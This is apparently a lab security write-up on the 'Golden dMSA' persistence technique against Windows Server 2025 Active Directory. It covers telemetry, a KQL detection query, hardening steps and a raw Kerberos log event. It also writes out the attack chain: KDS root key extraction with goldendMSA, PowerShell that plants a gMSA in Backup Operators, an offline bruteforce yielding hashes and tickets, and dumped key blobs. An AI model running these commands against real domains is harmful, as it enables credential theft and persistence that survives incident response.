# Golden dMSA — KDS Root Key Credential Derivation
## Offline Credential Derivation from the KDS Root Key

**Platform:** Windows Server 2025  
**UBR:** 26100.32690  
**Domain:** badsuccessor.local  
**Status:** No patch or architectural mitigation exists as of May 2026  
**Series:** Vector Research — Identity & Credential Attack Surface

---

## Overview

The Golden dMSA attack allows an attacker with Domain Admin access to derive valid, current credentials for any Group Managed Service Account (gMSA) or Delegated Managed Service Account (dMSA). Once the KDS root key is obtained from a domain controller, credential derivation becomes entirely offline — no LSASS, no DCSync, no password to reset.

> **Note:** This technique is distinct from BadSuccessor (CVE-2025-53779), which is a separate dMSA privilege escalation vulnerability requiring no prior DA. Golden dMSA requires DA-level access and targets the KDS root key as a persistence mechanism. The goldendMSA tool is published by Semperis.

The point is not the initial compromise. The point is what survives IR.

---

## Why This Is Different

To understand the persistence problem, it helps to understand what the KDS root key actually is.

The Key Distribution Service (KDS) root key is a domain-wide cryptographic secret stored on every domain controller. It is the root of trust for all managed service account password generation. Every gMSA and dMSA password is deterministically derived from it — which means that anyone who possesses the root key can derive valid managed service account credentials deterministically, without interacting with the domain again.

This is not a bug in the traditional sense. It is how the architecture works.

The security assumption baked into the design is that the KDS root key is inaccessible to anyone without Domain Admin. That assumption is correct. What the design does not account for is what happens after a DA-level compromise is detected and remediation begins — because the key itself is not part of standard IR remediation procedures.

Resetting privileged accounts does not invalidate credentials previously derived from the KDS root key. Unless the key itself is rotated — a procedure absent from most IR playbooks and difficult to execute safely at scale — the trust relationship persists.

Think of it this way: the KDS root key is the mint. Once an attacker has it, they can generate valid credentials for any managed service account in the domain on demand, indefinitely — until the mint itself is invalidated.

---

## The IR Survivability Problem

Standard post-compromise remediation typically involves:

- Rotating all privileged account passwords
- Disabling or removing accounts created by the attacker
- Rotating krbtgt twice to invalidate Kerberos tickets
- Reviewing and revoking suspicious access

None of these steps touch the KDS root key. An attacker who derived gMSA or dMSA credentials before remediation began retains valid, current credentials after it completes. The account authenticates. The domain accepts it. The IR team has declared the environment clean.

Experts in the field consistently emphasize that remediating an environment without sufficient forensic verification of what was touched — and what persists — is a direct path to repeat compromise. Golden dMSA represents exactly that gap: a credential surface that standard reset procedures do not reach, attached to accounts that are environmentally common and therefore unlikely to attract attention.

---

## Attack Chain

### Entry Condition

Domain Admin / SYSTEM on a domain controller. In this lab, obtained via goexec scheduled task delivery of a fileless encoded PowerShell payload — no binary on disk, no interactive logon, no RDP.

### KDS Root Key Extraction

With SYSTEM on the DC, goldendMSA extracts the KDS root key directly from the domain:

```cmd
C:\Windows\Temp\goldendMSA.exe kds --domain badsuccessor.local
```

Two keys returned — GUIDs and Base64 blobs. This is the only step requiring DC access. Everything that follows is offline.

### Account Creation and Weaponization

```powershell
New-ADServiceAccount -Name "svc-golden" -DNSHostName "svc-golden.badsuccessor.local" -PrincipalsAllowedToRetrieveManagedPassword "WIN-52H4TKKPD9C$"
Add-ADGroupMember -Identity "Backup Operators" -Members "svc-golden$"
```

`svc-golden$` is created as a gMSA and added to Backup Operators. A realistic service account in a privileged group — exactly the kind of account that survives a cursory post-incident review.

The lab also enumerated a pre-existing dMSA (`svc-backup$`) and extracted its associated KDS key — confirming the technique applies equally to both account types. The full bruteforce against the dMSA path was not executed in this run.

### Offline Credential Derivation

From a domain-joined machine, enumerate the account's SID and root key association via LDAP. Generate the wordlist and bruteforce offline:

```cmd
goldendMSA.exe bruteforce -s <SID> -i <KDS-GUID> -k <KDS-Base64> -d badsuccessor.local -u svc-golden$ -t
```

Result: NTLM hash, AES-256, AES-128, and a valid Kerberos ticket — imported directly.

### Authentication

Backup Operators membership confirmed via LDAP — `svc-golden$` is the sole member. Authentication events captured in telemetry (EID 4624, EID 4768). See telemetry section for detail.

---

## Telemetry

| EID | Signal | Host | Default? |
|-----|--------|------|----------|
| 4662 | KDS root key container read | DC02 | No — requires SACL |
| Sysmon 1 | Base64 encoded payload in CommandLine | DC02 | No — requires Sysmon + rule |
| Sysmon 1 | Unsigned binary, zeroed IMPHASH | WIN-52H4TKKPD9C | No — requires Sysmon + rule |
| 4768 | TGT issued for svc-golden$ | DC02 | Yes — if Kerberos auditing enabled |
| 4624 x19 | Successful network logon — svc-golden$ | DC02 | Yes — if logon auditing enabled |

### What the Telemetry Actually Tells You

**EID 4662** fires on every read of the KDS root key container. In this lab, 601 events were generated across the session — mostly background DC reads. The signal is real but requires filtering:

```kql
event.code: "4662" and winlog.event_data.ObjectType: *19195a5b*
  and not winlog.event_data.SubjectUserName: "DC02$"
```

Even filtered, noise from other machine accounts remains. EID 4662 is best treated as a supporting artifact to be correlated with a higher-fidelity primary signal — not a standalone alert.

**Sysmon zeroed IMPHASH** is the highest-fidelity standalone signal in this chain. goldendMSA.exe carries no import hash and no publisher. Execution of an unsigned, publisher-less binary from a staging path is a reliable indicator regardless of what the binary is actually doing.

**EID 4768** is clean. One TGT request for a service account outside of normal service startup windows is anomalous. In this lab, a single event fired — directly tied to the bruteforce ticket import.

**EID 4624** captured Kerberos authentication from the domain-joined member (192.168.1.188) and NTLM authentication from the attacker machine (192.168.1.218). The shared Logon GUID across Kerberos sessions enables correlation.

None of this telemetry is wired up in default configurations. The detection window closes the moment the Defender exclusion is removed.

---

## Remediation

The behavior is inherent to the current KDS/gMSA/dMSA architecture. No vendor patch exists as of May 2026, and Microsoft treats it as expected design — KDS root key access requires DA/EA/SYSTEM by design.

Semperis documents a sanitization path involving KDS root key rotation, primarily detailed for gMSAs. Microsoft provides official recovery guidance for Golden gMSA attacks but no dedicated dMSA-specific remediation documentation exists as of May 2026.

The rotation process is not equivalent to krbtgt double reset. It cannot be executed cleanly in a single maintenance window and carries significant service disruption risk due to caching behaviour across endpoints.

**Key caveats:**

- Password caching on endpoints means previously derived credentials may remain valid after key rotation, until the cache expires or the service re-requests the password
- Rotating the KDS root key does not automatically invalidate cached managed passwords on member machines
- The rotation procedure is complex — new KDS key creation, KDS service restarts across all DCs, authoritative restores for affected accounts, careful validation — and is absent from most IR runbooks
- In worst-case scenarios, full forest recovery or mass recreation of managed service accounts may be required

**Minimum defensive posture:**

- Add SACL to `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration` — enables EID 4662 visibility
- Enable DS Access auditing: `auditpol /set /subcategory:"Directory Service Access" /success:enable`
- Deploy Sysmon with zeroed IMPHASH and encoded CommandLine detection rules
- Include KDS root key assessment and rotation in IR runbooks for any domain compromise scenario
- Monitor privileged group membership for service accounts

---

## Research Taxonomy

**Control surface:** KDS root key — accessible to SYSTEM on any DC, provides offline derivation of all managed service account credentials domain-wide

**Risk surface:** Credential persistence through IR — derived credentials remain valid after standard remediation procedures complete

**Telemetry surface:** EID 4662 requires explicit SACL configuration; Sysmon rules require explicit deployment; neither is present by default

**Classification:** No patch or architectural mitigation exists as of May 2026. The attack surface is a function of the KDS design, not an implementation defect.

**Assumptions broken:** Password reset = credential invalidation. This assumption does not hold for gMSA/dMSA credentials while the KDS root key remains unrotated — and rotation itself carries operational caveats around cached passwords that mean full remediation is not always what it appears.

---

## References

- [Semperis — Golden dMSA attack](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [goldendMSA tool — Semperis](https://github.com/Semperis/GoldenDMSA)


SCREENSHOTS:

Initial attack

<img width="1911" height="970" alt="REVSHELL+OTHER" src="https://github.com/user-attachments/assets/765623c7-60c4-4ecf-95a2-301561cecd92" />

Key extraction

<img width="938" height="857" alt="KEYEXTRACTION" src="https://github.com/user-attachments/assets/6880b7b3-b4ec-40f9-8a01-ef6f8dd8930d" />

Key Material

SHELL> C:\Windows\Temp\goldendMSA.exe kds --domain badsuccessor.local

  ____        _     _             ____  __  __ ____    _    
 / ___|  ___ | | __| | ___ _ __  |  _ \|  \/  / ___|  / \   
| |  _  / _ \| |/ _` |/ _ \ '_ \ | | | | |\/| \___ \ / _ \  
| |_| || (_) | | (_| |  __/ | | || |_| | |  | |___) / ___ \ 
 \____| \___/|_|\__,_|\___|_| |_||____/|_|  |_|____/_/   \_\
                                                           
═══════════════════════════════════════════════════════════════
 Delegated + Group Managed Service Account creds extractor
═══════════════════════════════════════════════════════════════
Dumping from badsuccessor.local's DC. Must be running as system on this DC.

Guid:           c1425ab6-3cbb-23d3-9e0e-1971738d830f
Base64 blob:    AQAAALZaQsG7PNMjng4ZcXONgw8AAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGwAAABDAE4APQBEAEMAMAAyACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBiAGEAZABzAHUAYwBjAGUAcwBzAG8AcgAsAEQAQwA9AGwAbwBjAGEAbACAD8bu6sncAQQVxO7qydwBAAAAAAAAAABAAAAAAAAAAC1lG5bbifFTGdYndAX3S17S3ciug7URnUDQPmrgZ1mGiwHjX9yMq4drdpBcqZTO7b7isUX7jCCf7QBVL+QCyVU=
----------------------------------------------

Guid:           483d5d10-14e7-701c-1198-19a0840ae1cf
Base64 blob:    AQAAABBdPUjnFBxwEZgZoIQK4c8AAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGwAAABDAE4APQBEAEMAMAAyACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBiAGEAZABzAHUAYwBjAGUAcwBzAG8AcgAsAEQAQwA9AGwAbwBjAGEAbAAA2ScW68ncATNtekSXydwBAAAAAAAAAABAAAAAAAAAAM8HdaoigADiO1X377DNxTYjRlE/RgopOE+rhFq7eEg9HeETVUSQanWsEeJ7WF1iwilX7JvmLISsD2VhibaUYjA=
----------------------------------------------

SHELL> 

Keys extracted

<img width="1905" height="825" alt="GOLDENDMSAONOTHERMACHINE" src="https://github.com/user-attachments/assets/f14de4a6-124d-464a-9322-9c0341ab1dd5" />

<img width="1907" height="778" alt="WORDLISTGENERATION" src="https://github.com/user-attachments/assets/e9e309d2-3c1e-4e38-9950-bc104b25e677" />

<img width="1907" height="774" alt="passwordextraction" src="https://github.com/user-attachments/assets/3a6cd5e6-741a-4286-b7f4-a06b199c5b4b" />

TELEMETRY:

<img width="1918" height="1045" alt="GOEXEC" src="https://github.com/user-attachments/assets/411a7bae-3dba-474c-a1d4-10762e078846" />

<img width="1917" height="1007" alt="GOLDENDMSABINARYDETECTED" src="https://github.com/user-attachments/assets/d433a27e-ae69-46e1-b902-f61dc996f0de" />

<img width="1927" height="867" alt="EID4768TGTissuedforsvcgolden:" src="https://github.com/user-attachments/assets/18605fd4-db2d-4713-b534-666612f4660b" />

<img width="1916" height="965" alt="4624" src="https://github.com/user-attachments/assets/2da955b6-6612-45c2-9364-7cd0af7f6a33" />



4768

{
  "_index": ".ds-winlogbeat-8.19.14-2026.05.13-000002",
  "_id": "CIKwMp4BCMRlfIkZxjic",
  "_version": 1,
  "_source": {
    "@timestamp": "2026-05-16T21:28:22.684Z",
    "host": {
      "name": "DC02.badsuccessor.local"
    },
    "ecs": {
      "version": "8.0.0"
    },
    "agent": {
      "type": "winlogbeat",
      "version": "8.19.14",
      "ephemeral_id": "dbe5e97d-11ba-4260-8ca4-2eef08afc9bd",
      "id": "da0be4ac-b7cb-434d-a83a-52c3d46e772d",
      "name": "DC02"
    },
    "winlog": {
      "event_data": {
        "DCAvailableKeys": "RC4, AES128-SHA96, AES256-SHA96",
        "ClientAdvertizedEncryptionTypes": "\n\t\tAES256-CTS-HMAC-SHA1-96",
        "TargetUserName": "svc-golden$",
        "PreAuthType": "2",
        "TicketEncryptionType": "0x12",
        "ServiceSupportedEncryptionTypes": "0x0 (N/A)",
        "SessionKeyEncryptionType": "0x12",
        "PreAuthEncryptionType": "0x12",
        "TargetSid": "S-1-5-21-4102481429-207641625-1255947624-2603",
        "IpAddress": "::ffff:192.168.1.188",
        "AccountAvailableKeys": "RC4, AES128-SHA96, AES256-SHA96",
        "IpPort": "56534",
        "ServiceAvailableKeys": "RC4, AES128-SHA96, AES256-SHA96",
        "DCSupportedEncryptionTypes": "0x0 (N/A)",
        "TicketOptions": "0x40800010",
        "AccountSupportedEncryptionTypes": "0x1C (RC4, AES128-SHA96, AES256-SHA96)",
        "ServiceSid": "S-1-5-21-4102481429-207641625-1255947624-502",
        "ServiceName": "krbtgt",
        "Status": "0x0",
        "TargetDomainName": "badsuccessor.local",
        "ResponseTicket": "sJ0zJnNtx3/a60YJTp3jF0/5N2Yl3BeUSFWUleEyzLA="
      },
      "provider_name": "Microsoft-Windows-Security-Auditing",
      "computer_name": "DC02.badsuccessor.local",
      "keywords": [
        "Audit Success"
      ],
      "opcode": "Info",
      "provider_guid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
      "task": "Logon",
      "version": 2,
      "event_id": "4768",
      "record_id": 91638,
      "process": {
        "pid": 796,
        "thread": {
          "id": 2224
        }
      },
      "api": "wineventlog",
      "channel": "Security"
    },
    "event": {
      "code": "4768",
      "kind": "event",
      "provider": "Microsoft-Windows-Security-Auditing",
      "outcome": "success",
      "action": "Logon",
      "created": "2026-05-16T21:28:23.780Z"
    },
    "log": {
      "level": "information"
    },
    "message": "A Kerberos authentication ticket (TGT) was requested.\n\nAccount Information:\n\tAccount Name:\t\tsvc-golden$\n\tSupplied Realm Name:\tbadsuccessor.local\n\tUser ID:\t\t\tS-1-5-21-4102481429-207641625-1255947624-2603\n\tMSDS-SupportedEncryptionTypes:\t0x1C (RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nService Information:\n\tService Name:\t\tkrbtgt\n\tService ID:\t\tS-1-5-21-4102481429-207641625-1255947624-502\n\tMSDS-SupportedEncryptionTypes:\t0x0 (N/A)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nDomain Controller Information:\n\tMSDS-SupportedEncryptionTypes:\t0x0 (N/A)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nNetwork Information:\n\tClient Address:\t\t::ffff:192.168.1.188\n\tClient Port:\t\t56534\n\tAdvertized Etypes:\t\n\t\tAES256-CTS-HMAC-SHA1-96\n\nAdditional Information:\n\tTicket Options:\t\t0x40800010\n\tResult Code:\t\t0x0\n\tTicket Encryption Type:\t0x12\n\tSession Encryption Type:\t0x12\n\tPre-Authentication Type:\t2\n\tPre-Authentication EncryptionType:\t0x12\n\nCertificate Information:\n\tCertificate Issuer Name:\t\t\n\tCertificate Serial Number:\t\n\tCertificate Thumbprint:\t\t\n\nTicket information\n\tResponse ticket hash:\t\tsJ0zJnNtx3/a60YJTp3jF0/5N2Yl3BeUSFWUleEyzLA=\n\nCertificate information is only provided if a certificate was used for pre-authentication.\n\nPre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120."
  },
  "fields": {
    "winlog.event_data.PreAuthEncryptionType": [
      "0x12"
    ],
    "winlog.event_data.SessionKeyEncryptionType": [
      "0x12"
    ],
    "winlog.event_data.ResponseTicket": [
      "sJ0zJnNtx3/a60YJTp3jF0/5N2Yl3BeUSFWUleEyzLA="
    ],
    "winlog.event_data.IpAddress": [
      "::ffff:192.168.1.188"
    ],
    "winlog.provider_guid": [
      "{54849625-5478-4994-a5ba-3e3b0328c30d}"
    ],
    "winlog.provider_name": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "winlog.computer_name": [
      "DC02.badsuccessor.local"
    ],
    "winlog.process.pid": [
      796
    ],
    "winlog.event_data.TicketEncryptionType": [
      "0x12"
    ],
    "winlog.event_data.TicketOptions": [
      "0x40800010"
    ],
    "winlog.event_data.ServiceAvailableKeys": [
      "RC4, AES128-SHA96, AES256-SHA96"
    ],
    "winlog.keywords": [
      "Audit Success"
    ],
    "winlog.record_id": [
      "91638"
    ],
    "log.level": [
      "information"
    ],
    "agent.name": [
      "DC02"
    ],
    "host.name": [
      "DC02.badsuccessor.local"
    ],
    "event.kind": [
      "event"
    ],
    "event.outcome": [
      "success"
    ],
    "winlog.version": [
      2
    ],
    "winlog.event_data.TargetUserName": [
      "svc-golden$"
    ],
    "winlog.event_data.IpPort": [
      "56534"
    ],
    "agent.hostname": [
      "DC02"
    ],
    "winlog.event_data.DCSupportedEncryptionTypes": [
      "0x0 (N/A)"
    ],
    "event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "event.code": [
      "4768"
    ],
    "agent.id": [
      "da0be4ac-b7cb-434d-a83a-52c3d46e772d"
    ],
    "ecs.version": [
      "8.0.0"
    ],
    "event.created": [
      "2026-05-16T21:28:23.780Z"
    ],
    "winlog.event_data.DCAvailableKeys": [
      "RC4, AES128-SHA96, AES256-SHA96"
    ],
    "winlog.event_data.AccountAvailableKeys": [
      "RC4, AES128-SHA96, AES256-SHA96"
    ],
    "agent.version": [
      "8.19.14"
    ],
    "winlog.event_data.ServiceName": [
      "krbtgt"
    ],
    "winlog.event_data.ServiceSid": [
      "S-1-5-21-4102481429-207641625-1255947624-502"
    ],
    "winlog.process.thread.id": [
      2224
    ],
    "winlog.event_data.PreAuthType": [
      "2"
    ],
    "winlog.event_data.AccountSupportedEncryptionTypes": [
      "0x1C (RC4, AES128-SHA96, AES256-SHA96)"
    ],
    "winlog.event_data.ClientAdvertizedEncryptionTypes": [
      "\n\t\tAES256-CTS-HMAC-SHA1-96"
    ],
    "winlog.event_data.ServiceSupportedEncryptionTypes": [
      "0x0 (N/A)"
    ],
    "agent.type": [
      "winlogbeat"
    ],
    "winlog.event_data.Status": [
      "0x0"
    ],
    "winlog.event_data.TargetSid": [
      "S-1-5-21-4102481429-207641625-1255947624-2603"
    ],
    "winlog.api": [
      "wineventlog"
    ],
    "winlog.task": [
      "Logon"
    ],
    "message": [
      "A Kerberos authentication ticket (TGT) was requested.\n\nAccount Information:\n\tAccount Name:\t\tsvc-golden$\n\tSupplied Realm Name:\tbadsuccessor.local\n\tUser ID:\t\t\tS-1-5-21-4102481429-207641625-1255947624-2603\n\tMSDS-SupportedEncryptionTypes:\t0x1C (RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nService Information:\n\tService Name:\t\tkrbtgt\n\tService ID:\t\tS-1-5-21-4102481429-207641625-1255947624-502\n\tMSDS-SupportedEncryptionTypes:\t0x0 (N/A)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nDomain Controller Information:\n\tMSDS-SupportedEncryptionTypes:\t0x0 (N/A)\n\tAvailable Keys:\tRC4, AES128-SHA96, AES256-SHA96\n\nNetwork Information:\n\tClient Address:\t\t::ffff:192.168.1.188\n\tClient Port:\t\t56534\n\tAdvertized Etypes:\t\n\t\tAES256-CTS-HMAC-SHA1-96\n\nAdditional Information:\n\tTicket Options:\t\t0x40800010\n\tResult Code:\t\t0x0\n\tTicket Encryption Type:\t0x12\n\tSession Encryption Type:\t0x12\n\tPre-Authentication Type:\t2\n\tPre-Authentication EncryptionType:\t0x12\n\nCertificate Information:\n\tCertificate Issuer Name:\t\t\n\tCertificate Serial Number:\t\n\tCertificate Thumbprint:\t\t\n\nTicket information\n\tResponse ticket hash:\t\tsJ0zJnNtx3/a60YJTp3jF0/5N2Yl3BeUSFWUleEyzLA=\n\nCertificate information is only provided if a certificate was used for pre-authentication.\n\nPre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120."
    ],
    "winlog.event_id": [
      "4768"
    ],
    "event.action": [
      "Logon"
    ],
    "@timestamp": [
      "2026-05-16T21:28:22.684Z"
    ],
    "winlog.channel": [
      "Security"
    ],
    "winlog.event_data.TargetDomainName": [
      "badsuccessor.local"
    ],
    "winlog.opcode": [
      "Info"
    ],
    "agent.ephemeral_id": [
      "dbe5e97d-11ba-4260-8ca4-2eef08afc9bd"
    ]
  }
}









